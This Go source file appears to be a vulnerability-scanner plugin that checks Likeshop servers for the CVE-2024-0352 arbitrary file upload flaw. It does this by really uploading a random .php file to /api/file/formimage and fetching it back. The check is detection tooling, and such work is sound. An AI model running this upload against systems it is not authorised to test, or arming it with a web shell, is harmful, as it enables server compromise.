package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"regexp"
	"strings"
)

func init() {
	Register("likeshop_file_upload_cve_2024_0352", &likeshop_file_upload_cve_2024_0352{})
}

type likeshop_file_upload_cve_2024_0352 struct{}

func (p *likeshop_file_upload_cve_2024_0352) Info() PluginInfo {
	return PluginInfo{
		Name:     "Likeshop任意文件上传",
		VulnInfo: "Likeshop是一个100%开源免费的B2B2C多商户商城系统，该产品存在任意文件上传，攻击者可通过此漏洞上传木马获取服务器权限。",
		VulnID:   "CVE-2024-0352",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "version<= 2.5.7.20210311",
		CWE:      "CWE-434	危险类型文件的不加限制上传",
	}
}

func (p *likeshop_file_upload_cve_2024_0352) Check(netloc string) bool {
	payload1 := "------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name=\"file\";filename=\""
	filename := utils.GenRandom(5)
	payload2 := ".php\"\r\nContent-Type: application/x-php\r\n\r\n"
	randstr := utils.GenRandom(15)
	payload3 := "\r\n------WebKitFormBoundarygcflwtei--\r\n"

	req, err := http.NewRequest("POST", netloc+"/api/file/formimage", bytes.NewBufferString(payload1+filename+payload2+randstr+payload3))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 {
		re := regexp.MustCompile(`"url":"([^"]+)"`)
		match := re.FindStringSubmatch(resp.ResponseRaw)
		if len(match) < 2 {
			return false
		}
		check_url := match[1]
		check_url = strings.ReplaceAll(check_url, "\\", "")

		check_req, err := http.NewRequest("GET", check_url, nil)
		if err != nil {
			return false
		}
		check_resp, err := utils.RequestDo(check_req, true, 2)
		if err != nil {
			return false
		}

		if check_resp.Other.StatusCode == 200 && strings.Contains(check_resp.ResponseRaw, randstr) {
			return true
		}
	}
	return false
}
